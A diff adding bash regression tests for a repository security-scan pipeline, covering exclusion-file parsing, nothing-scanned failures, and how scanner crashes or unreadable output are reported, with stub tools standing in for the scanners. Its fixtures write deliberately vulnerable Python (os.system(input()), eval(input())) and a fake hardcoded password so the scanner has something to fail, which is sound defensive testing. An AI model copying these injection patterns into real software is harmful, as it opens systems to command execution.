@@ -2589,6 +2589,437 @@ print(json.load(open(sys.argv[1]))['verdict'])" "${SCRATCH}/i_rep/report_scan_re
 fi
 
 # ═════════════════════════════════════════════════════════════════════════════
+# LAYER J — Bash hardening from the owner's decision record of 2026-11-13
+# Each block below pins one entry of docs/engine_divergences.md (D-003 … D-042) and was seen RED against
+# the script as it stood before the change (git show HEAD:scan_pipeline.sh) before the change was made.
+# Stubs stand in for every scanner, as in Layer G: only npm, file, strings, unzip and jq exist on the CI host.
+# ═════════════════════════════════════════════════════════════════════════════
+group "Layer J — bash hardening (decision record 2026-11-13)"
+if ! _skipping; then
+    JW="${SCRATCH}/j_work"; JR="${SCRATCH}/j_rep"; mkdir -p "$JW" "$JR"
+    JENV=()
+    j_scan() {   # j_scan <dir> <name>   (extra environment in JENV); sets JOUT, JEC, JREP
+        JREP="${JR}/report_scan_$2.json"; rm -f "$JREP"
+        JOUT=$(cd "$ROOT_DIR" && env ${JENV[@]+"${JENV[@]}"} WORK_DIR="${JWD:-$JW}" timeout 300 bash ./scan_pipeline.sh "$1" "$JR" "$2" 2>&1); JEC=$?
+    }
+    j_py() {     # j_py <report> <python expression over d and a> [a]; prints the value, or "unreadable"
+        python3 -c "
+import json, sys
+d = json.load(open(sys.argv[1]))
+a = sys.argv[3] if len(sys.argv) > 3 else ''
+print(eval(sys.argv[2]))" "$@" 2>/dev/null || echo "unreadable"
+    }
+    j_msgs() {   # j_msgs <report> <file_results key>: the messages recorded for one entry, or ABSENT
+        j_py "$1" "d['file_results'].get(a, {}).get('message', 'ABSENT')" "$2"
+    }
+    j_hostile() {   # j_hostile <dir> <name>: a file the scan must fail
+        mkdir -p "$1"; printf 'import os\nos.system(input())\nprint(eval(input()))\n' > "$1/$2"
+    }
+
+    # ── D-003: .transitignore is read the way it is written ───────────────────────────────
+    # A last line with no newline used to be lost and a CRLF file never matched (the CR was part of the pattern).
+    J3="${SCRATCH}/j3_nonl"; rm -rf "$J3"; j_hostile "$J3" a.py; j_hostile "$J3" b.py
+    printf 'a.py\nb.py' > "$J3/.transitignore"
+    j_scan "$J3" j3_nonl
+    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" \
+        "D-003: the last line of .transitignore is read although it has no trailing newline"
+    J3C="${SCRATCH}/j3_crlf"; rm -rf "$J3C"; j_hostile "$J3C" a.py; j_hostile "$J3C" b.py
+    printf '# comment\r\n\r\na.py\r\nb.py\r\n' > "$J3C/.transitignore"
+    j_scan "$J3C" j3_crlf
+    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" \
+        "D-003: a CRLF .transitignore works (one trailing CR is removed from each line)"
+    J3D="${SCRATCH}/j3_crlf_only"; rm -rf "$J3D"; j_hostile "$J3D" a.py; j_hostile "$J3D" keep.py
+    printf 'a.py\r\n' > "$J3D/.transitignore"
+    j_scan "$J3D" j3_crlf_only
+    assert_contains "$(j_msgs "$JREP" "${J3D}/keep.py")" "[FAIL]" \
+        "D-003: …and a file the CRLF .transitignore does not name is still scanned"
+    assert_eq "ABSENT" "$(j_msgs "$JREP" "${J3D}/a.py")" "D-003: …while the one it names is not"
+
+    # ── D-004: exclusions leave a trace, and excluding everything is not a pass ───────────
+    J4="${SCRATCH}/j4_trace"; rm -rf "$J4"; j_hostile "$J4" a.py; printf 'print(1)\n' > "$J4/ok.py"
+    printf '# why\n\na.py\nb.py\n' > "$J4/.transitignore"
+    j_scan "$J4" j4_trace
+    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] transitignore:exclusions_applied(2 pattern(s))" \
+        "D-004: .transitignore patterns are reported once, with their number (comments and blank lines do not count)"
+    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-004: …and the WARN alone does not change the verdict"
+    J4E="${SCRATCH}/j4_empty_file"; rm -rf "$J4E"; j_hostile "$J4E" a.py; printf '# nothing\n\n' > "$J4E/.transitignore"
+    j_scan "$J4E" j4_empty_file
+    assert_not_contains "$(j_msgs "$JREP" __global__)" "transitignore" \
+        "D-004: a .transitignore with no pattern gives no WARN"
+    J4S="${SCRATCH}/j4_star"; rm -rf "$J4S"; j_hostile "$J4S" a.py; printf 'password = "hunter2hunter2"\n' > "$J4S/cfg.py"
+    printf '*\n' > "$J4S/.transitignore"
+    j_scan "$J4S" j4_star
+    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" "D-004: a .transitignore of * no longer passes a repository with nothing scanned"
+    assert_eq "1" "$JEC" "D-004: …and the exit status says so"
+    assert_contains "$(j_msgs "$JREP" __global__)" "[FAIL] engine:nothing_scanned" "D-004: …with the FAIL engine:nothing_scanned on __global__"
+    assert_contains "$(j_msgs "$JREP" __global__)" "exclusions_applied(1 pattern(s))" "D-004: …next to the WARN"
+    assert_eq "L4_patterns=skipped:nothing scanned (every file excluded) L5_per_language_sast=skipped:nothing scanned (every file excluded)" \
+        "$(j_py "$JREP" "' '.join(k + '=' + d['coverage'][k] for k in ('L4_patterns', 'L5_per_language_sast'))")" \
+        "D-004: layers 4 and 5 do not read as ran when every file was excluded"
+    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L4_patterns" "D-004: …they are coverage gaps"
+    assert_eq "1 engine:nothing_scanned __global__" \
+        "$(j_py "$JREP" "' '.join(str(x) for x in (len(d['findings']), d['findings'][0]['message'], d['findings'][0]['file']))")" \
+        "D-004: the nothing-scanned FAIL is a structured finding record"
+    # The bar cannot be lowered and the finding cannot be allowlisted: the repository's author controls both.
+    printf '[{"rule":"engine","path":"__global__","reason":"x"},{"rule":"nothing_scanned","path":"__global__","reason":"x"}]\n' > "$J4S/.transit-allow.json"
+    JENV=(MIN_SEVERITY=critical); j_scan "$J4S" j4_star_crit; JENV=()
+    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" \
+        "D-004: engine:nothing_scanned is neither downgraded by --min-severity critical nor allowlisted"
+    assert_contains "$(j_msgs "$JREP" __global__)" "[FAIL] engine:nothing_scanned" "D-004: …it stays a FAIL in the report"
+    OUT_SCH=$(cd "$ROOT_DIR" && python3 -I tests/conformance/check_schema.py --report "$JREP" 2>&1); EC_SCH=$?
+    assert_eq "0" "$EC_SCH" "D-004: the nothing-scanned report conforms to docs/report.schema.json and the invariants"
+    [[ "$EC_SCH" == 0 ]] || printf '%s\n' "$OUT_SCH" | tail -n 5 >&2
+    # Three situations that are NOT errors: they keep their behaviour.
+    J4Z="${SCRATCH}/j4_emptydir"; rm -rf "$J4Z"; mkdir -p "$J4Z"
+    j_scan "$J4Z" j4_emptydir
+    assert_eq "PASS ran ran" "$(j_py "$JREP" "' '.join((d['verdict'], d['coverage']['L4_patterns'], d['coverage']['L5_per_language_sast']))")" \
+        "D-004: an empty directory is still a PASS with layers 4 and 5 ran"
+    J4B="${SCRATCH}/j4_builtin"; rm -rf "$J4B"; mkdir -p "$J4B/node_modules/x"; printf 'eval(input())\n' > "$J4B/node_modules/x/i.py"
+    j_scan "$J4B" j4_builtin
+    assert_eq "PASS ran" "$(j_py "$JREP" "' '.join((d['verdict'], d['coverage']['L4_patterns']))")" \
+        "D-004: a repository whose files are all under the built-in exclusions is still a PASS (ran)"
+    printf 'docs\n' > "$J4B/.transitignore"
+    j_scan "$J4B" j4_builtin_ti
+    assert_eq "PASS ran" "$(j_py "$JREP" "' '.join((d['verdict'], d['coverage']['L4_patterns']))")" \
+        "D-004: …also with a .transitignore, because no file was removed by it (the built-in ones are not counted)"
+    assert_contains "$(j_msgs "$JREP" __global__)" "exclusions_applied(1 pattern(s))" "D-004: …and the WARN is still there"
+    J4D="${SCRATCH}/j4_diff"; rm -rf "$J4D"; mkdir -p "$J4D" "${SCRATCH}/j4_diffwork"
+    printf 'print(1)\n' > "$J4D/ok.py"; printf 'zzz\n' > "$J4D/.transitignore"
+    printf '%s:' "${J4D}/no_such_file.py" > "${SCRATCH}/j4_diffwork/.diff_files"
+    (cd "$ROOT_DIR" && SINCE_COMMIT=abc WORK_DIR="${SCRATCH}/j4_diffwork" bash ./scan_pipeline.sh "$J4D" "$JR" j4_diff >/dev/null 2>&1) || true
+    assert_eq "PASS ran" "$(j_py "${JR}/report_scan_j4_diff.json" "' '.join((d['verdict'], d['coverage']['L5_per_language_sast']))")" \
+        "D-004: a diff run with no changed files is still a PASS (ran), with a .transitignore that excludes nothing"
+
+    # ── D-038: no file is skipped because of its name ─────────────────────────────────────
+    # .manifest_sha256.txt was skipped at any depth. ai_transit.sh keeps only the ROOT one (the fetcher's own) out
+    # of the archive, so a nested file of that name carried any payload into the approved ZIP unscanned.
+    J9="${SCRATCH}/j9_manifest"; rm -rf "$J9"; mkdir -p "$J9/sub"; printf 'print(1)\n' > "$J9/ok.py"
+    printf 'password = "hunter2hunter2"\n' > "$J9/sub/.manifest_sha256.txt"
+    j_scan "$J9" j9_nested
+    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" "D-038: a payload in a nested .manifest_sha256.txt fails the repository"
+    assert_contains "$(j_msgs "$JREP" "${J9}/sub/.manifest_sha256.txt")" "CWE-798:hardcoded_credential"         "D-038: …it is scanned like any file and has its own entry in the report"
+    J9R="${SCRATCH}/j9_root"; rm -rf "$J9R"; mkdir -p "$J9R"; printf 'print(1)\n' > "$J9R/ok.py"
+    printf 'password = "hunter2hunter2"\n' > "$J9R/.manifest_sha256.txt"
+    j_scan "$J9R" j9_root
+    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" "D-038: …and so is one at the root of the scanned directory"
+    J9Z="${SCRATCH}/j9_zip"; rm -rf "$J9Z"; mkdir -p "$J9Z/sub"; printf 'print(1)\n' > "$J9Z/ok.py"
+    printf 'e3b0c44298fc1c14  ./x\n' > "$J9Z/sub/.manifest_sha256.txt"
+    run_pipeline "$J9Z" --quiet
+    assert_eq "0" "$RUN_EXIT" "D-038: a harmless nested .manifest_sha256.txt does not fail the pipeline"
+    assert_eq ".manifest_sha256.txt sub/.manifest_sha256.txt" \
+        "$(j_py "$RUN_JSON" "' '.join(sorted(k.split('/fetch/', 1)[1].split('/', 1)[1] for k in d['file_results'] if k.endswith('manifest_sha256.txt')))")" \
+        "D-038: …both the fetcher's root manifest and the nested file are in the report"
+    ZIPLIST=$(unzip -Z1 "${RUN_WORK}"/out/*.zip 2>/dev/null | grep manifest || true)
+    assert_eq "sub/.manifest_sha256.txt" "$ZIPLIST" \
+        "D-038: ai_transit.sh keeps only the ROOT manifest out of the archive; a nested one ships, now that it was scanned"
+    J9Y="${SCRATCH}/j9_ship"; rm -rf "$J9Y"; mkdir -p "$J9Y/sub"; printf 'print(1)\n' > "$J9Y/ok.py"
+    printf 'password = "hunter2hunter2"\n' > "$J9Y/sub/.manifest_sha256.txt"
+    run_pipeline "$J9Y" --quiet
+    assert_eq "1" "$RUN_EXIT" "D-038: ai_transit.sh no longer approves a repository whose only payload is a nested .manifest_sha256.txt"
+    assert_eq "0" "$(ls "${RUN_WORK}"/out/*.zip 2>/dev/null | wc -l | tr -d ' ')" "D-038: …and builds no archive for it"
+
+    # ── D-005: a partially staged Semgrep rule set completes the run ──────────────────────
+    # The last statement of scan_owasp_cwe was `[[ -z "${LAYER_COVERAGE[L2_owasp_cwe]:-}" ]] && record_layer … ran`.
+    # With `partial:` already recorded that test is false, the function returns 1 and set -e ends the run: exit 1,
+    # no report, no sidecar. The partial state could therefore never reach a report.
+    j_stubdir() { local d="${SCRATCH}/j_st_$1"; rm -rf "$d"; mkdir -p "$d"; printf '%s' "$d"; }
+    j_stub() {   # j_stub <dir> <tool> [sh body]  (body on stdin when omitted); records its arguments in <dir>/<tool>_calls.txt
+        local body="${3-}"; [[ $# -ge 3 ]] || body=$(cat)
+        printf '#!/bin/sh\necho "$@" >> "%s/%s_calls.txt"\n%s\n' "$1" "$2" "$body" > "$1/$2"; chmod +x "$1/$2"
+    }
+    J5S=$(j_stubdir sg_partial); j_stub "$J5S" semgrep "echo '{\"results\":[],\"errors\":[]}'"
+    J5C="${SCRATCH}/j5_cache"; rm -rf "$J5C"; mkdir -p "$J5C/semgrep-rules"
+    echo "rules: []" > "$J5C/semgrep-rules/owasp-top-ten.yaml"; echo "rules: []" > "$J5C/semgrep-rules/cwe-top-25.yaml"
+    JENV=(PATH="${J5S}:${PATH}" OFFLINE_CACHE="$J5C"); j_scan "${FIXTURES}/clean" j5_partial; JENV=()
+    assert_eq "0" "$JEC" "D-005: two of four Semgrep rule files staged: the run completes (it used to exit 1 with no report)"
+    assert_eq "partial:rulesets missing (security-audit secrets)" "$(j_py "$JREP" "d['coverage']['L2_owasp_cwe']")" \
+        "D-005: …and the report says partial, naming the rule sets that are missing"
+    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L2_owasp_cwe" "D-005: …it is a coverage gap"
+    assert_eq "False" "$(j_py "$JREP" "d['coverage_complete']")" "D-005: …so coverage is not complete"
+    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-005: …and the verdict follows the findings (none)"
+    assert_eq "2" "$(grep -c -- '--config=' "${J5S}/semgrep_calls.txt")" "D-005: …Semgrep ran once for each rule set that is staged"
+    assert_eq "last-line-PASS" "last-line-$(printf '%s\n' "$JOUT" | tail -n 1 | sed 's/\x1b\[[0-9;]*m//g')" "D-005: …and the last line of output is the verdict"
+    J5F=$(j_stubdir sg_partial_find)
+    j_stub "$J5F" semgrep "echo '{\"results\":[{\"check_id\":\"rule.x\",\"path\":\"${FIXTURES}/clean/t.py\",\"start\":{\"line\":2},\"extra\":{\"message\":\"m\",\"severity\":\"ERROR\"}}]}'"
+    JENV=(PATH="${J5F}:${PATH}" OFFLINE_CACHE="$J5C"); j_scan "${FIXTURES}/clean" j5_partial_find; JENV=()
+    assert_eq "FAIL 2 partial" "$(j_py "$JREP" "d['verdict'] + ' ' + str(sum(1 for f in d['findings'] if f['tool'] == 'semgrep')) + ' ' + d['coverage']['L2_owasp_cwe'].split(':')[0]")" \
+        "D-005: with a partial rule set, a finding of the rule sets that ran still fails the scan"
+
+    # ── D-006: a ScanCode that was switched on and could not deliver says so in the coverage block ─────
+    # Before, scan_error / no_report_generated / python3_missing left only a WARN and no L6_licence entry at all,
+    # so coverage_complete could stay true with the licence layer never having produced anything.
+    J6A=$(j_stubdir sc_fail); j_stub "$J6A" scancode "exit 3"
+    JENV=(PATH="${J6A}:${PATH}" RUN_SCANCODE=true); j_scan "${FIXTURES}/clean" j6_fail; JENV=()
+    assert_eq "skipped:scancode failed (exit 3)" "$(j_py "$JREP" "d['coverage'].get('L6_licence', 'ABSENT')")" \
+        "D-006: ScanCode exiting non-zero: L6_licence is skipped, with the exit status"
+    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L6_licence" "D-006: …it is a coverage gap"
+    assert_eq "False" "$(j_py "$JREP" "d['coverage_complete']")" "D-006: …and coverage is not complete"
+    assert_contains "$(j_msgs "$JREP" __global__)" "scancode:scan_error" "D-006: …the WARN is still recorded next to it"
+    J6B=$(j_stubdir sc_noreport); j_stub "$J6B" scancode "exit 0"
+    JENV=(PATH="${J6B}:${PATH}" RUN_SCANCODE=true); j_scan "${FIXTURES}/clean" j6_noreport; JENV=()
+    assert_eq "skipped:scancode produced no report" "$(j_py "$JREP" "d['coverage'].get('L6_licence', 'ABSENT')")" \
+        "D-006: ScanCode exiting 0 without writing a report: skipped, no report"
+    assert_contains "$(j_msgs "$JREP" __global__)" "scancode:no_report_generated" "D-006: …with its WARN"
+    J6C=$(j_stubdir sc_ok)
+    j_stub "$J6C" scancode <<'EOF'
+while [ $# -gt 0 ]; do case "$1" in --json-pp) out="$2" ;; esac; shift; done
+echo '{"files":[]}' > "$out"
+EOF
+    JENV=(PATH="${J6C}:${PATH}" RUN_SCANCODE=true); j_scan "${FIXTURES}/clean" j6_ok; JENV=()
+    assert_eq "ran" "$(j_py "$JREP" "d['coverage'].get('L6_licence', 'ABSENT')")" "D-006: a ScanCode that wrote a report is still ran"
+    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-006: …and an empty result is a PASS"
+    # python3 cannot be hidden from a whole run (the report writer needs it), so the function runs alone with a
+    # has_cmd that does not find it.
+    SC_FN=$(sed -n '/^scan_scancode() {/,/^}/p' "${ROOT_DIR}/scan_pipeline.sh")
+    mkdir -p "${SCRATCH}/j6_py/reports"
+    SC_PY=$(bash -c '
+        set -euo pipefail
+        declare -A LAYER_COVERAGE; WARNS=""
+        info() { :; }; ok() { :; }; warn() { :; }
+        has_cmd() { [[ "$1" != python3 ]]; }
+        record_warn() { WARNS+="$*;"; }
+        record_layer() { LAYER_COVERAGE["$1"]="$2"; }
+        scancode() { while [ $# -gt 0 ]; do case "$1" in --json-pp) echo "{}" > "$2" ;; esac; shift; done; }
+        OFFLINE=true; WORK_DIR="$1"; TIMESTAMP=t; SCAN_DIR=/nowhere; TRANSIT_DIR=/nowhere
+        '"$SC_FN"'
+        scan_scancode
+        echo "${LAYER_COVERAGE[L6_licence]:-ABSENT}|$WARNS"' _ "${SCRATCH}/j6_py" 2>&1)
+    assert_contains "$SC_PY" "skipped:python3 not available|" "D-006: python3 not found: L6_licence is skipped, python3 not available"
+    assert_contains "$SC_PY" "scancode:python3_missing" "D-006: …with its WARN"
+
+    # ── D-008: YARA is recorded when it ran, and when it had nothing to run ───────────────────────
+    J8S=$(j_stubdir yara_ran); j_stub "$J8S" yara "exit 0"
+    J8W="${SCRATCH}/j8_work"; rm -rf "$J8W"; mkdir -p "$J8W/yara-rules"; echo 'rule x { condition: false }' > "$J8W/yara-rules/x.yar"
+    JENV=(PATH="${J8S}:${PATH}"); JWD="$J8W"; j_scan "${FIXTURES}/clean" j8_ran; JENV=(); JWD=""
+    assert_eq "ran" "$(j_py "$JREP" "d['coverage'].get('L1_ioc_yara', 'ABSENT')")" "D-008: a YARA run with a rule file is recorded as ran"
+    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-008: …and a rule with no match is a PASS"
+    J8M=$(j_stubdir yara_hit); j_stub "$J8M" yara "echo 'x_rule /scanned/file'"
+    JENV=(PATH="${J8M}:${PATH}"); JWD="$J8W"; j_scan "${FIXTURES}/clean" j8_hit; JENV=(); JWD=""
+    assert_contains "$(j_msgs "$JREP" "${FIXTURES}/clean")" "yara:ioc_match:x.yar" "D-008: a rule that matches still fails the scan"
+    assert_eq "ran" "$(j_py "$JREP" "d['coverage'].get('L1_ioc_yara', 'ABSENT')")" "D-008: …and the layer is ran"
+    J8E="${SCRATCH}/j8_empty"; rm -rf "$J8E"; mkdir -p "$J8E/yara-rules"
+    JENV=(PATH="${J8S}:${PATH}"); JWD="$J8E"; j_scan "${FIXTURES}/clean" j8_empty; JENV=(); JWD=""
+    assert_eq "skipped:yara rules directory has no .yar files" "$(j_py "$JREP" "d['coverage'].get('L1_ioc_yara', 'ABSENT')")" \
+        "D-008: yara installed, rules directory present but without a .yar file: skipped, and it says why"
+    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L1_ioc_yara" "D-008: …it is a coverage gap"
+    J8D="${SCRATCH}/j8_nodir"; rm -rf "$J8D"; mkdir -p "$J8D"
+    JENV=(PATH="${J8S}:${PATH}"); JWD="$J8D"; j_scan "${FIXTURES}/clean" j8_nodir; JENV=(); JWD=""
+    assert_eq "skipped:yara or rules directory missing" "$(j_py "$JREP" "d['coverage'].get('L1_ioc_yara', 'ABSENT')")" \
+        "D-008: yara installed but no rules directory: the existing state is unchanged"
+
+    # ── D-015: a tool that crashed, or printed what cannot be read, is not "ran, nothing found" ───────────
+    # Semgrep, detect-secrets and trivy used to count unparseable output as zero findings with the layer ran, and
+    # every non-zero exit of clamscan was clamav:malware_detected, so a scan error read as an infection.
+    J15C="${SCRATCH}/j15_cache"; rm -rf "$J15C"; mkdir -p "$J15C/semgrep-rules" "$J15C/trivy-db/db" "$J15C/clamav"
+    for _r in owasp-top-ten cwe-top-25 security-audit secrets; do echo "rules: []" > "$J15C/semgrep-rules/${_r}.yaml"; done
+    touch "$J15C/trivy-db/db/trivy.db" "$J15C/clamav/main.cvd"
+    j15_run() {   # j15_run <name> <env…>: the clean fixture with the stub directory J15S first on PATH
+        local name="$1"; shift
+        JENV=(PATH="${J15S}:${PATH}" OFFLINE_CACHE="$J15C" "$@"); j_scan "${FIXTURES}/clean" "$name"; JENV=()
+    }
+    j15_cov() { j_py "$JREP" "d['coverage'].get('$1', 'ABSENT')"; }
+
+    # Semgrep (layer 2)
+    J15S=$(j_stubdir sg_crash); j_stub "$J15S" semgrep "echo 'Traceback (most recent call last)'; exit 7"
+    j15_run j15_sg_crash
+    assert_eq "skipped:semgrep failed (exit 7)" "$(j15_cov L2_owasp_cwe)" "D-015: Semgrep crashing (exit 7) is not ran"
+    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] semgrep:scan_error_exit_7" "D-015: …a WARN says which rule set and which exit status"
+    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L2_owasp_cwe" "D-015: …it is a coverage gap"
+    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-015: …and the verdict still follows the findings (none were produced)"
+    J15S=$(j_stubdir sg_garbage); j_stub "$J15S" semgrep "echo 'this is not json'"
+    j15_run j15_sg_garbage
+    assert_eq "skipped:semgrep output could not be read" "$(j15_cov L2_owasp_cwe)" "D-015: Semgrep exiting 0 with output that is not JSON is not ran"
+    assert_contains "$(j_msgs "$JREP" __global__)" "semgrep:output_could_not_be_read" "D-015: …with its WARN"
+    J15S=$(j_stubdir sg_empty); j_stub "$J15S" semgrep "exit 0"
+    j15_run j15_sg_empty
+    assert_eq "skipped:semgrep output could not be read" "$(j15_cov L2_owasp_cwe)" "D-015: Semgrep printing nothing is not ran"
+    J15S=$(j_stubdir sg_nores); j_stub "$J15S" semgrep "echo '{}'"
+    j15_run j15_sg_nores
+    assert_eq "skipped:semgrep output could not be read" "$(j15_cov L2_owasp_cwe)" "D-015: JSON without a results list is not ran either"
+    J15S=$(j_stubdir sg_one_bad)
+    j_stub "$J15S" semgrep <<EOF
+case "\$*" in *cwe-top-25*) exit 2 ;; esac
+echo '{"results":[{"check_id":"rule.x","path":"${FIXTURES}/clean/t.py","start":{"line":2},"extra":{"message":"m","severity":"ERROR"}}]}'
+EOF
+    j15_run j15_sg_one_bad
+    assert_eq "skipped:semgrep failed (exit 2)" "$(j15_cov L2_owasp_cwe)" "D-015: one rule set failing out of four makes the layer not ran"
+    assert_eq "FAIL 3" "$(j_py "$JREP" "d['verdict'] + ' ' + str(sum(1 for f in d['findings'] if f['tool'] == 'semgrep'))")" \
+        "D-015: …while the findings of the three that ran are kept and fail the scan"
+    J15S=$(j_stubdir sg_exit1); j_stub "$J15S" semgrep "echo '{\"results\":[],\"errors\":[]}'; exit 1"
+    j15_run j15_sg_exit1
+    assert_eq "ran" "$(j15_cov L2_owasp_cwe)" "D-015: Semgrep exiting 1 with readable JSON is understood: ran"
+    J15S=$(j_stubdir sg_ok); j_stub "$J15S" semgrep "echo '{\"results\":[]}'"
+    j15_run j15_sg_ok
+    assert_eq "ran" "$(j15_cov L2_owasp_cwe)" "D-015: a readable empty result is still ran"
+
+    # detect-secrets (layer 1)
+    J15S=$(j_stubdir ds_crash); j_stub "$J15S" detect-secrets "echo 'boom' >&2; exit 7"
+    j15_run j15_ds_crash
+    assert_eq "skipped:detect-secrets failed (exit 7)" "$(j15_cov L1_secrets_entropy)" "D-015: detect-secrets crashing (exit 7) is not ran"
+    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] detect-secrets:scan_error_exit_7" "D-015: …with a WARN"
+    J15S=$(j_stubdir ds_garbage); j_stub "$J15S" detect-secrets "echo 'garbage'"
+    j15_run j15_ds_garbage
+    assert_eq "skipped:detect-secrets output could not be read" "$(j15_cov L1_secrets_entropy)" "D-015: detect-secrets printing garbage is not ran"
+    assert_contains "$(j_msgs "$JREP" __global__)" "detect-secrets:output_could_not_be_read" "D-015: …with a WARN"
+    assert_eq "0" "$(j_py "$JREP" "d['summary']['pass'] - $(j_py "${JR}/report_scan_j15_sg_ok.json" "d['summary']['pass']")")" \
+        "D-015: …and no PASS is counted for the layer that did not read"
+    J15S=$(j_stubdir ds_ok); j_stub "$J15S" detect-secrets "echo '{\"version\":\"1.5\",\"results\":{}}'"
+    j15_run j15_ds_ok
+    assert_eq "ran" "$(j15_cov L1_secrets_entropy)" "D-015: a readable result with no secrets is ran"
+    J15S=$(j_stubdir ds_hits); j_stub "$J15S" detect-secrets "echo '{\"results\":{\"a.py\":[{\"type\":\"x\"},{\"type\":\"y\"}]}}'"
+    j15_run j15_ds_hits
+    assert_eq "ran" "$(j15_cov L1_secrets_entropy)" "D-015: detect-secrets with hits is ran…"
+    assert_contains "$(j_msgs "$JREP" "${FIXTURES}/clean")" "detect-secrets:2_high_entropy_string(s)" "D-015: …and its hits still fail the scan"
+
+    # trivy (layer 3, RUN_SCA=true)
+    J15S=$(j_stubdir tv_crash); j_stub "$J15S" trivy "exit 5"
+    j15_run j15_tv_crash RUN_SCA=true
+    assert_eq "skipped:trivy failed (exit 5)" "$(j15_cov L3_dependency_cve)" "D-015: trivy crashing (exit 5) is not ran"
+    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] trivy:scan_error_exit_5" "D-015: …with a WARN"
+    J15S=$(j_stubdir tv_garbage); j_stub "$J15S" trivy "echo 'not json'"
+    j15_run j15_tv_garbage RUN_SCA=true
+    assert_eq "skipped:trivy output could not be read" "$(j15_cov L3_dependency_cve)" "D-015: trivy printing garbage is not ran"
+    assert_not_contains "$JOUT" "trivy: no known CVEs" "D-015: …and the console does not claim there are no known CVEs"
+    J15S=$(j_stubdir tv_ok); j_stub "$J15S" trivy "echo '{\"SchemaVersion\":2,\"Results\":[]}'"
+    j15_run j15_tv_ok RUN_SCA=true
+    assert_eq "ran" "$(j15_cov L3_dependency_cve)" "D-015: a readable trivy result is ran"
+    assert_contains "$JOUT" "trivy: no known CVEs" "D-015: …and says so"
+    J15S=$(j_stubdir tv_vuln); j_stub "$J15S" trivy "echo '{\"Results\":[{\"Vulnerabilities\":[{\"VulnerabilityID\":\"CVE-1\"},{\"VulnerabilityID\":\"CVE-2\"}]}]}'"
+    j15_run j15_tv_vuln RUN_SCA=true
+    assert_contains "$(j_msgs "$JREP" "${FIXTURES}/clean")" "trivy:2_vulnerable_dependencies" "D-015: trivy findings still fail the scan"
+    J15S=$(j_stubdir tv_nodb); j_stub "$J15S" trivy "echo '{\"Results\":[]}'"
+    JENV=(PATH="${J15S}:${PATH}" OFFLINE_CACHE="${SCRATCH}/j15_nodb" RUN_SCA=true); j_scan "${FIXTURES}/clean" j15_tv_nodb; JENV=()
+    assert_eq "skipped:trivy database not staged for offline use" "$(j15_cov L3_dependency_cve)" "D-015: trivy with no staged database: the existing state is unchanged"
+    assert_not_contains "$JOUT" "trivy: no known CVEs" "D-015: …and it no longer claims there are no known CVEs, nor counts a PASS, for a scan that did not happen"
+    assert_eq "no-calls" "$([[ -f "${J15S}/trivy_calls.txt" ]] && echo calls || echo no-calls)" "D-015: …trivy is not even started"
+
+    # clamscan (layer 1)
+    J15S=$(j_stubdir cl_clean); j_stub "$J15S" clamscan "exit 0"
+    j15_run j15_cl_clean
+    assert_eq "ran" "$(j15_cov L1_malware)" "D-015: clamscan exit 0 is clean: ran"
+    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-015: …a PASS"
+    J15S=$(j_stubdir cl_virus); j_stub "$J15S" clamscan "echo 'x: Eicar FOUND'; exit 1"
+    j15_run j15_cl_virus
+    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" "D-015: clamscan exit 1 is an infection: FAIL"
+    assert_contains "$(j_msgs "$JREP" "${FIXTURES}/clean")" "clamav:malware_detected" "D-015: …clamav:malware_detected"
+    assert_eq "ran" "$(j15_cov L1_malware)" "D-015: …and the layer is ran"
+    J15S=$(j_stubdir cl_error); j_stub "$J15S" clamscan "echo 'ERROR: Can not open file' >&2; exit 2"
+    j15_run j15_cl_error
+    assert_eq "skipped:clamav failed (exit 2)" "$(j15_cov L1_malware)" "D-015: clamscan exit 2 is a tool error, not ran"
+    assert_not_contains "$(j_py "$JREP" "d['file_results']")" "malware_detected" "D-015: …it is not reported as malware"
+    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] clamav:scan_error_exit_2" "D-015: …a WARN says what happened"
+    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-015: …and the verdict follows the findings (none)"
+    JENV=(PATH="${J15S}:${PATH}" OFFLINE_CACHE="${SCRATCH}/j15_nosig"); j_scan "${FIXTURES}/clean" j15_cl_nosig; JENV=()
+    assert_eq "skipped:clamav failed (exit 2)" "$(j15_cov L1_malware)" \
+        "D-015: clamscan failing with no signatures staged: the failure is what the layer reports"
+
+    # ── D-029: the exclusion rules read a file that contains a NUL byte ───────────────────────────────
+    # grep_check_excl pipes one grep into a second. On a file with a NUL byte the first grep treats the file as
+    # binary and prints nothing to the pipe, so the second reads nothing and the rule can never match: one NUL byte
+    # silenced pip:vcs_requirement_not_pinned_to_a_commit and every other rule that uses an exclusion.
+    J29="${SCRATCH}/j29_nul"; rm -rf "$J29"; mkdir -p "$J29/pinned" "$J29/xml"
+    printf 'requests==2.0\0\ngit+https://github.com/org/repo#egg=repo\n' > "$J29/requirements.txt"
+    printf 'requests==2.0\0\ngit+https://github.com/org/repo@abcdef1234567#egg=repo\n' > "$J29/pinned/requirements.txt"
+    printf '<settings>\0\n<password>hunter2hunter2</password>\n</settings>\n' > "$J29/xml/settings.xml"
+    printf '<settings>\0\n<password>${env.PASS}</password>\n</settings>\n' > "$J29/xml/ref.xml"
+    j_scan "$J29" j29_nul
